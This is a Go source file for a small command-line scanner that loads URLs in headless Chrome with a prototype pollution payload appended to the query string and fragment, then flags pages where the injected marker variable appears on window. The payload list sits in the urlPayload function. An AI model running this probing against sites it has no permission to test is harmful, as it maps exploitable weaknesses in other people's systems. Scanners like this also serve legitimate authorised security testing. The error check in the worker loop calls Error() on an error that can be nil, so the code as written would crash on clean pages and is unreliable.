package main

import (
	"bufio"
	"context"
	"flag"
	"fmt"
	"log"
	"os"
	"regexp"
	"sync"
	"time"

	"github.com/chromedp/chromedp"

	"github.com/fatih/color"
)

func init() {
	fmt.Println(color.YellowString("=================================================="))
	fmt.Println(color.CyanString("       ▛▀▖▜    ▐  ▗             "))
	fmt.Println(color.CyanString("       ▙▄▘▐ ▌ ▌▜▀ ▄ ▞▀▖▛▀▖      "))
	fmt.Println(color.CyanString("       ▌  ▐ ▌ ▌▐ ▖▐ ▌ ▌▌ ▌      "))
	fmt.Println(color.CyanString("▀▀▀▀▀▀ ▘   ▘▝▀▘ ▀ ▀▘▝▀ ▘ ▘▀▀▀▀▀▀") + "v0.1 By @divadbate")

	fmt.Println(color.BlueString("Scans URLs for Prototype Pollution via query parameter."))
	fmt.Println(color.YellowString("=================================================="))
	fmt.Println(color.CyanString("Credits:"))
	fmt.Println("-@tomnomnom for inspiring me with Page-fetch")
	fmt.Println("-Blackfan (github.com/BlackFan/client-side-prototype-pollution)")
	fmt.Println(color.YellowString("==================================================\n"))

}

var output string
var concurrency int
var customPayload string
var URLpayload string

func main() {
	log.SetFlags(0) //supress date and time on each line

	flag.StringVar(&customPayload, "p", "", "--> Set custom URL payload (The varable RENDERED must be called 'zzzc')"+"\n") //do this with hasempty
	flag.StringVar(&output, "o", "/dev/null", "--> Output (Will only output vulnerable URLs)"+"\n")
	flag.IntVar(&concurrency, "c", 5, "--> Number of concurrent threads (default 5)"+"\n")
	flag.Parse()

	//create the output file
	file, err := os.OpenFile(output, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		log.Fatalf("failed creating file: %s", err)

	}
	datawriter := bufio.NewWriter(file)

	copts := append(chromedp.DefaultExecAllocatorOptions[:],
		chromedp.Flag("ignore-certificate-errors", true),
	)

	ectx, ecancel := chromedp.NewExecAllocator(context.Background(), copts...)
	defer ecancel()

	pctx, pcancel := chromedp.NewContext(ectx)
	defer pcancel()

	// start the browser to ensure we end up making new tabs in an
	// existing browser instead of making a new browser each time.
	// see: https://godoc.org/github.com/chromedp/chromedp#NewContext
	if err := chromedp.Run(pctx); err != nil {
		fmt.Fprintf(os.Stderr, "error starting browser: %s\n", err)
		return
	}

	sc := bufio.NewScanner(os.Stdin)

	var wg sync.WaitGroup
	jobs := make(chan string)

	for i := 0; i < concurrency; i++ {
		wg.Add(1)
		go func() {
			for requestURL := range jobs {

				ctx, cancel := context.WithTimeout(pctx, time.Second*10)
				ctx, _ = chromedp.NewContext(ctx)
				var res string

				err := chromedp.Run(ctx,
					chromedp.Navigate(requestURL+hasQuery(requestURL)+URLpayload),
					chromedp.Evaluate("window.zzzc", &res),
				)
				fmt.Println(requestURL + hasQuery(requestURL) + URLpayload)

				if res != "" || err.Error() == "json: cannot unmarshal array into Go value of type string" { //fix this hack
					log.Printf("%s: %v", color.GreenString("[+]")+requestURL, color.GreenString("Vulnerable!"))
					datawriter.WriteString(requestURL + "\n")
					datawriter.Flush()
				}

				if err != nil && err.Error() != "json: cannot unmarshal array into Go value of type string" { //fix this hack
					fmt.Println(color.RedString("[-]"), requestURL, color.RedString(err.Error()))
				}

				cancel()
			}
			wg.Done()
		}()
	}
	for sc.Scan() {
		jobs <- sc.Text()
	}
	close(jobs)
	wg.Wait()
}

//Does the URL contain a query already?
func hasQuery(url string) string {
	var Qmark = regexp.MustCompile(`\?`)
	var p = ""
	urlPayload()
	if Qmark.MatchString(url) {
		p = "&"

	} else {
		p = "?"
	}
	return p
}

//todo add chuncking
func urlPayload() {

	if !containsEmpty(customPayload) {
		URLpayload = customPayload
	} else {
		URLpayload = "constructor.prototype.zzzc=cccz&__proto__[zzzc]=cccz&constructor[prototype][zzzc]=cccz&__proto__.zzzc=cccz#__proto__[zzzc]=cccz"

	}
}

//check if header flags are empty
func containsEmpty(ss ...string) bool {
	for _, s := range ss {
		if s == "" {
			return true
		}
	}
	return false
}

